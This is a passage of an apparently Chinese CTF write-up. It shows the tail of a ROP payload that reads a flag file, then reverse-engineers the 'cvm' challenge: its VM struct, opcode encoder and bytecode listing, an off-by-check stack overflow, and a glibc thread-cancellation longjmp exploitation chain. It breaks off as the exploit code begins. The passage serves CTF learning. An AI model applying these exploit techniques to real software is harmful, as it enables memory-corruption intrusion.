class="hljs-number">0x7FAEEC</span><br>bss_addr=<span class="hljs-number">0xC90000</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span><br>payload+=p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">2</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">8</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">0</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">7</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">1</span>)+p64(syscall_addr)<br><span class="hljs-built_in">print</span>(repeater(channel,payload))<br></code></pre></td></tr></table></figure>
+
+<p>tcpdump抓包，因为是本地所以抓lo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo tcpdump -w flag.pcap -i lo</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/flag.png" srcset="/img/loading.gif" lazyload class title="flag">
+
+<p>简简又单单，但有笨b没做出来^v^</p>
+<h1 id="cvm"><a href="#cvm" class="headerlink" title="cvm"></a>cvm</h1><p>要打TLS但有个屑为了调试直接把start_thread patch了^v^</p>
+<h2 id="c-，狗都不逆，汪"><a href="#c-，狗都不逆，汪" class="headerlink" title="c++，狗都不逆，汪"></a>c++，狗都不逆，汪</h2><p>比赛的时候其实已经把这玩意逆完了</p>
+<p>vm的控制数据结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> &#123;</span><br>    <span class="hljs-type">size_t</span> overflow;			<span class="hljs-comment">// 不知道干嘛的</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *stack_base;		<span class="hljs-comment">// 栈基址指针</span><br>        <span class="hljs-type">void</span> *stack_top;		<span class="hljs-comment">// 栈顶指针</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-type">void</span> *mem_addr;		<span class="hljs-comment">// 栈空间地址</span><br>            <span class="hljs-type">size_t</span> mem_size;	<span class="hljs-comment">// 栈空间大小，0x20000</span><br>        &#125; mem;<br>    &#125; <span class="hljs-built_in">stack</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *mem_addr;			<span class="hljs-comment">// text段地址</span><br>        <span class="hljs-type">size_t</span> mem_size;		<span class="hljs-comment">// text段大小，0x20000</span><br>    &#125; code;<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    	stack和code的数据结构</span><br><span class="hljs-comment">        high</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |		stack	   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |		code	   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">        low</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">void</span> *func_calls_begin;		<span class="hljs-comment">// 不知道干嘛的+1</span><br>    <span class="hljs-type">void</span> *func_calls_end;		<span class="hljs-comment">// 不知道干嘛的+2</span><br>    <span class="hljs-type">void</span> *unknown;				<span class="hljs-comment">// 不知道干嘛的+3</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> lock;			<span class="hljs-comment">// 处理interrupt的锁</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> finish;		<span class="hljs-comment">// vm是否停止的标记</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field1;		<span class="hljs-comment">// 占位</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field2;		<span class="hljs-comment">// 占位+1</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> code_rip;		<span class="hljs-comment">// rip，offset的形式</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>支持的指令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_nop</span>():			<span class="hljs-comment"># rip++</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_pop</span>():			<span class="hljs-comment"># stack_rop-=8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_add</span>():			<span class="hljs-comment"># pop出两个数计算后push进stack，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_sub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_div</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_and</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_or</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_xor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_not</span>():			<span class="hljs-comment"># 单目运算符类似</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0A&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_call</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0B&#x27;</span>		<span class="hljs-comment"># 怪，不管不重要</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ret</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0C&#x27;</span>		<span class="hljs-comment"># pop offset，rip=offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_lea</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0D&#x27;</span>		<span class="hljs-comment"># pop offset，push stack_base+offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push1</span>(<span class="hljs-params">value</span>):	<span class="hljs-comment"># push x个字节，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0E&#x27;</span> + value.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push2</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0F&#x27;</span> + value.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push4</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span> + value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push8</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span> + value.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_modcall</span>():		<span class="hljs-comment"># 可以通过这个进行read和write，通过throw exception和catch实现</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jz</span>():			<span class="hljs-comment"># pop offset，pop num，根据num判断是否跳转到offset，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jb</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ja</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_dup</span>():			<span class="hljs-comment"># push *stack_top</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_hlt</span>():			<span class="hljs-comment"># stop</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x17&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>program.bin如下：</p>
+<table>
+<thead>
+<tr>
+<th>rip</th>
+<th>字节码</th>
+<th>命令</th>
+<th>栈内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><strong>11</strong> 57 65 6c 63 6f 6d 65 20</td>
+<td>push b’Welcome ‘</td>
+<td>b’Welcome ‘</td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>11</strong> 74 6f 20 54 53 43 54 46</td>
+<td>push b’to TSCTF’</td>
+<td>b’Welcome to TSCTF’</td>
+</tr>
+<tr>
+<td>12</td>
+<td><strong>11</strong> 21 0a 0a 53 74 61 72 74</td>
+<td>push b’!\n\nStart’</td>
+<td>b’Welcome to TSCTF!\n\nStart’</td>
+</tr>
+<tr>
+<td>1b</td>
+<td><strong>11</strong> 20 79 6f 75 72 20 65 78</td>
+<td>push b’ your ex’</td>
+<td>b’Welcome to TSCTF!\n\nStart your ex’</td>
+</tr>
+<tr>
+<td>24</td>
+<td><strong>11</strong> 70 6c 6f 69 74 20 66 72</td>
+<td>push b’ploit fr’</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit fr’</td>
+</tr>
+<tr>
+<td>2d</td>
+<td><strong>11</strong> 6f 6d 20 68 65 72 65 21</td>
+<td>push b’om here!’</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td>36</td>
+<td><strong>11</strong> 30 00 00 00 00 00 00 00</td>
+<td>push p64(0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30)</td>
+</tr>
+<tr>
+<td>3f</td>
+<td><strong>11</strong> 00 00 00 00 00 00 00 00</td>
+<td>push p64(0)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30)+p64(0)</td>
+</tr>
+<tr>
+<td>48</td>
+<td><strong>0d</strong></td>
+<td>pop p64(0)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>push p64(stack)</td>
+<td>+p64(0x30)+p64(stack)</td>
+</tr>
+<tr>
+<td>49</td>
+<td><strong>11</strong> fc d2 98 14 10 2c 24 14</td>
+<td>push p64(output)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30)+p64(stack)+p64(output)</td>
+</tr>
+<tr>
+<td>52</td>
+<td><strong>12</strong></td>
+<td>output(stack,0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(cnt)</td>
+</tr>
+<tr>
+<td>53</td>
+<td><strong>11</strong> 30 00 00 00 00 00 00 00</td>
+<td>push p64(0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(cnt)+p64(0x30)</td>
+</tr>
+<tr>
+<td>5c</td>
+<td><strong>03</strong></td>
+<td>pop p64(0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>pop p64(0x30)</td>
+<td>+p64(0x30-cnt)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>push p64(0x30-cnt)</td>
+<td></td>
+</tr>
+<tr>
+<td>5d</td>
+<td><strong>16</strong></td>
+<td>dup</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30-cnt)+p64(0x30-cnt)</td>
+</tr>
+<tr>
+<td>5e</td>
+<td><strong>11</strong> 9a 00 00 00 00 00 00 00</td>
+<td>push p64(0x9a)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30-cnt)+p64(0x30-cnt)+p64(0x9a)</td>
+</tr>
+<tr>
+<td>67</td>
+<td><strong>15</strong></td>
+<td>jg</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30-cnt)</td>
+</tr>
+<tr>
+<td>68</td>
+<td><strong>11</strong> 9a 00 00 00 00 00 00 00</td>
+<td>push p64(0x9a)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x30-cnt)+p64(0x9a)</td>
+</tr>
+<tr>
+<td>71</td>
+<td><strong>14</strong></td>
+<td>jl</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td>72</td>
+<td><strong>11</strong> 9b 00 00 00 00 00 00 00</td>
+<td>push p64(0x9b)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)</td>
+</tr>
+<tr>
+<td>7b</td>
+<td><strong>11</strong> 00 10 00 00 00 00 00 00</td>
+<td>push p64(0x1000)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)+p64(0x1000)</td>
+</tr>
+<tr>
+<td>84</td>
+<td><strong>11</strong> 00 00 00 00 00 00 00 00</td>
+<td>push p64(0)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)+p64(0x1000)+p64(0)</td>
+</tr>
+<tr>
+<td>8d</td>
+<td><strong>0d</strong></td>
+<td>pop p64(0)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>push p64(stack)</td>
+<td>+p64(0x9b)+p64(0x1000)+p64(stack)</td>
+</tr>
+<tr>
+<td>8e</td>
+<td><strong>11</strong> 1c 85 c6 e3 59 76 6d f0</td>
+<td>push p64(input)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)+p64(0x1000)+p64(stack)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(input)</td>
+</tr>
+<tr>
+<td>97</td>
+<td><strong>12</strong></td>
+<td>input(stack,0x1000)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)+p64(cnt)</td>
+</tr>
+<tr>
+<td>98</td>
+<td><strong>01</strong></td>
+<td>pop</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(0x9b)</td>
+</tr>
+<tr>
+<td>99</td>
+<td><strong>0c</strong></td>
+<td>ret</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td>9a</td>
+<td><strong>17</strong></td>
+<td>hlt</td>
+<td></td>
+</tr>
+<tr>
+<td>9b</td>
+<td><strong>11</strong> 48 61 76 65 20 66 75 6e</td>
+<td>push b’Have fun’</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+b’Have fun’</td>
+</tr>
+<tr>
+<td>a4</td>
+<td><strong>11</strong> 08 00 00 00 00 00 00 00</td>
+<td>push p64(8)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+b’Have fun’+p64(8)</td>
+</tr>
+<tr>
+<td>ad</td>
+<td><strong>11</strong> 30 00 00 00 00 00 00 00</td>
+<td>push p64(0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+b’Have fun’+p64(8)+p64(0x30)</td>
+</tr>
+<tr>
+<td>b6</td>
+<td><strong>0d</strong></td>
+<td>pop p64(0x30)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>push p64(stack+0x30)</td>
+<td>+b’Have fun’+p64(8)+p64(0x30)+p64(stack)</td>
+</tr>
+<tr>
+<td>b7</td>
+<td><strong>11</strong> fc d2 98 14 10 2c 24 14</td>
+<td>push p64(output)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+b’Have fun’+p64(8)+p64(0x30)+p64(stack)</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+p64(output)</td>
+</tr>
+<tr>
+<td>c0</td>
+<td><strong>12</strong></td>
+<td>output(stack+0x30,8)</td>
+<td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>+b’Have fun’+p64(cnt)</td>
+</tr>
+<tr>
+<td>c1</td>
+<td><strong>17</strong></td>
+<td>hlt</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>漏洞点，判断stack overflow的时候用的&#x3D;&#x3D;，但push有1248四种，可以溢出</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/stackoverflow.png" srcset="/img/loading.gif" lazyload class title="stackoverflow">
+
+<p>且memory out of range还取了页对齐，所以可以溢出0xfff字节</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/outofrange.png" srcset="/img/loading.gif" lazyload class title="outofrange">
+
+<p>比赛的时候注意到这个了，但当时脑子抽了以为stack在code下面，虽然就算没搞错我把多线程patch掉了且不会打TLS也没戏.jpg</p>
+<p><em>其实也不算太难逆，主要是各种检查和io都是由exception实现的，看起来很丑，嗯，都是c++的锅</em></p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先贴一个线程结构体（部分）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Unwind information.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread_unwind_buf</span> *<span class="hljs-title">cleanup_jmp_buf</span>;</span><br>  <span class="hljs-type">void</span> *result;<br><br>  <span class="hljs-comment">/* Flags determining processing of cancellation.  */</span><br>  <span class="hljs-type">int</span> cancelhandling;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>read和write函数中会根据__libc_single_threaded全局变量判断是否需要调用__pthread_enable_asynccancel开启异步取消</p>
+<p><em>源码不如汇编系列，珍爱生命原理宏定义</em></p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/single_thread.png" srcset="/img/loading.gif" lazyload class title="single_thread">
+
+<p>多线程时__libc_single_threaded&#x3D;0否则__libc_single_threaded&#x3D;1</p>
+<h3 id="pthread-enable-asynccancel"><a href="#pthread-enable-asynccancel" class="headerlink" title="__pthread_enable_asynccancel"></a>__pthread_enable_asynccancel</h3><p>__pthread_enable_asynccancel大致流程：</p>
+<ul>
+<li>获取当前线程的cancelhandling，进入循环</li>
+<li>判断是否已经设置了异步取消CANCELTYPE_BIT，是则跳出循环，否则继续执行</li>
+<li>设置CANCELTYPE_BIT</li>
+<li>判断当前线程的cancelhandling是否设置了CANCELED_BITMASK需要被取消，否则跳出循环，是则<ul>
+<li>设置当前线程result为PTHREAD_CANCELED</li>
+<li>调用__do_cancel取消线程</li>
+</ul>
+</li>
+</ul>
+<h3 id="do-cancel"><a href="#do-cancel" class="headerlink" title="__do_cancel"></a>__do_cancel</h3><ul>
+<li>设置当前线程cancelhandling的EXITING_BITMASK（确保不会再被其他线程取消）</li>
+<li>调用__pthread_unwind，参数为当前线程的cleanup_jmp_buf</li>
+</ul>
+<h3 id="pthread-unwind"><a href="#pthread-unwind" class="headerlink" title="__pthread_unwind"></a>__pthread_unwind</h3><p>当一个函数拥有多个互斥锁却不幸被cancel时这个函数用于完成他的遗嘱doge</p>
+<ul>
+<li>初始化线程的exc的一些field</li>
+<li>调用_Unwind_ForcedUnwind，参数是exc，unwind_stop函数和cleanup_jmp_buf</li>
+</ul>
+<h3 id="Unwind-ForcedUnwind"><a href="#Unwind-ForcedUnwind" class="headerlink" title="_Unwind_ForcedUnwind"></a>_Unwind_ForcedUnwind</h3><ul>
+<li><p>调用__libc_unwind_link_get获取全局struct unwind_link global，里面的函数都是加密过的</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/global.png" srcset="/img/loading.gif" lazyload class title="global">
+</li>
+<li><p>获取当前线程的pointer_guard，解密ptr__Unwind_ForcedUnwind</p>
+</li>
+<li><p>调用ptr__Unwind_ForcedUnwind指向的函数，这个是libgcc_s.so.1中的_Unwind_ForcedUnwind函数</p>
+</li>
+</ul>
+<h3 id="unwind-stop"><a href="#unwind-stop" class="headerlink" title="unwind_stop"></a>unwind_stop</h3><p>在libgcc中执行一些函数后又会回到glibc执行unwind_stop，参数stop_parameter为当前线程的cleanup_jmp_buf</p>
+<ul>
+<li>在start_thread创建新线程的时候会调用setjmp新建cleanup_jmp_buf，如果这个线程被取消，则调用longjmp返回start_thread进行收尾工作</li>
+<li>unwind_stop会判断最后保存的上下文是不是正在展开的栈帧，是则调用longjmp，<strong>需要利用这一过程</strong></li>
+</ul>
+<h3 id="longjmp"><a href="#longjmp" class="headerlink" title="longjmp"></a>longjmp</h3><p>调用流程如下，这里的函数指针当然也是加密过的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_longjmp -&gt; __longjmp_cancel -&gt; *(cleanup_jmp_buf+<span class="hljs-number">0x38</span>)(cleanup_jmp_buf)<br>    							   rsp=*(cleanup_jmp_buf+<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure>
+
+<p><em>加密是循环<strong>左移0x11</strong>不是右移11^v^</em></p>
+<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>用循环，只用dup发的数据太多read可能提前结束</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 